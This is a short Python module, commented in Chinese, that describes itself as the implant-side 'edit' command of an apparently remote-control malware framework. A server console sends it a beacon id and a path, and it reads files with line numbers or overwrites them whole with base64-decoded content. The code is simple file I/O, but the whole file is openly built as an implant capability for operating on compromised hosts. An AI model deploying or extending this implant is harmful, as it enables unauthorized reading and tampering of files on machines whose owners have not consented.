"""edit — 文件编辑(植入物端): 读(带行号) / 写(整文件替换)。

- content_b64 为空: 读模式——返回带行号的内容(行号便于定位编辑)
- content_b64 非空: 写模式——base64 解码整文件替换(wb), 返回写入字节数

配合: server 端 console `edit <bid> <path> [@local_file | 文本内容]`
"""

import base64

MODULE = {
    "desc": "文件编辑: 读(带行号) / 写(整文件替换)",
    "params": [("path", "必填"), ("content_b64", "可选；空=读, 非空=整文件替换")],
}

_MAX_OUT = 65536  # 读模式输出上限(与 cat 一致)


def run(path, content_b64=""):
    if content_b64:
        # ── 写模式: 整文件替换 ──
        try:
            data = base64.b64decode(content_b64)
        except (ValueError, TypeError) as e:
            return f"(error: bad base64: {e})"
        try:
            with open(path, "wb") as f:
                f.write(data)
            return f"(written {len(data)} bytes to {path})"
        except OSError as e:
            return f"(error: {e})"

    # ── 读模式: 带行号 ──
    import os
    if not os.path.isfile(path):
        return f"(not found or not a file: {path})"
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            lines = f.readlines()
    except PermissionError:
        return f"(permission denied: {path})"
    except OSError as e:
        return f"(error: {e})"
    if not lines:
        return "(empty)"
    out = "".join(f"{i + 1:>6} | {ln}" for i, ln in enumerate(lines))
    if len(out) > _MAX_OUT:
        out = out[:_MAX_OUT] + f"\n... (truncated, {len(out)} bytes total)"
    return out.rstrip("\n")


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("usage: edit <path> [content_b64]")
        sys.exit(1)
    c = sys.argv[2] if len(sys.argv) > 2 else ""
    print(run(sys.argv[1], c))
